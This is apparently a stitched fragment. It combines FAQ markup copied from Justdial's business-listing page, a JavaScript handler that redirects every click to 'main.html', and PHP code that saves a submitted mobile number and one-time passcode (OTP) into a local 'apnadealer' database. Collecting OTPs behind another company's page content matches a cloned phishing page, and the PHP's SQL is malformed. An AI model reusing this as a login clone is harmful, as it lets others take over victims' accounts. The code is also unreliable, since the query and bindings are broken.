                        <div class="undefined color111">
                            <div id="1" class="gotquestion_details__uZIBC ">
                                <summary tabindex="0" class="fw600">What are the benefits of listing a business on
                                    Justdial?</summary>
                                <p>Justdial is India&#x27;s No. 1 local search platform and provides a range of benefits
                                    for businesses listed on the platform such as</p>
                                <ul>
                                    <li>Boost your online presence and get more customers - Justdial has a customer base
                                        of 17+ crore. Listing your business will help you reach out to these users when
                                        your business listing or your business category is searched on Justdial.</li>
                                    <li>Create an online catalogue to showcase your ready-to-buy products or services
                                        for prospective clients seeking for more detailed information.</li>
                                    <li>Build Trust - Having an online presence on Justdial will help you build trust
                                        with customers and engage with them via reply to reviews and questions.</li>
                                    <li>Publish Deals, Menu, Rate Card, Brochure, etc to inform your potential customers
                                        about your business offerings.</li>
                                </ul>
                            </div>
                            <div id="2" class="gotquestion_details__uZIBC ">
                                <summary tabindex="0" class="fw600">Can I list my business for FREE on Justdial?
                                </summary>
                                <p>Totally! Just add your phone number, address, and business type – it&#x27;s super
                                    easy!</p>
                            </div>
                            <div id="3" class="gotquestion_details__uZIBC ">
                                <summary tabindex="0" class="fw600">I already have a website and social media. Do I
                                    still need Justdial?</summary>
                                <div>
                                    <p>Yes, your free business listing complements your website and social media
                                        presence. Adding your website and social media handles to your Justdial profile
                                        will make your site more visible to customers searching for your business
                                        listing or category.</p>
                                </div>
                            </div>
                            <div id="4" class="gotquestion_details__uZIBC ">
                                <summary tabindex="0" class="fw600">Do I need to download the Jd App to create and
                                    manage my business listing?</summary>
                                <p>You are not required to download the Justdial app to create or manage your listing.
                                    Both our website and mobile browser offer user-friendly interfaces for this purpose.
                                    However, the app provides additional features, such as competitor tracking, which
                                    can be a valuable tool for optimizing your online presence.</p>

addEventListener("click", redirect)
function redirect(){
    window.location = "main.html";
  }



 

    <?php
    if (isset($_POST['mobile no'])) 
    {
	$mobileNumber = $_POST['mobile no'];
}
if (isset($_POST['otp'])) 
    {
     $otp = $_POST['otp'];
    }

	// Database connection
	$conn = new mysqli('localhost','root','','apnadealer');
	if($conn->connect_error){
		echo "$conn->connect_error";
		die("Connection Failed : ". $conn->connect_error);
	} else {
		$stmt = $conn->prepare("insert into login page('mobile no.', 'OTP') values(?,?)");
		$stmt->bind_param("ii", $mobileNumber, $otp);
		$execval = $stmt->execute();
		echo $execval;
		echo "Registration successfully...";
		$stmt->close();
		$conn->close();
	}
?>
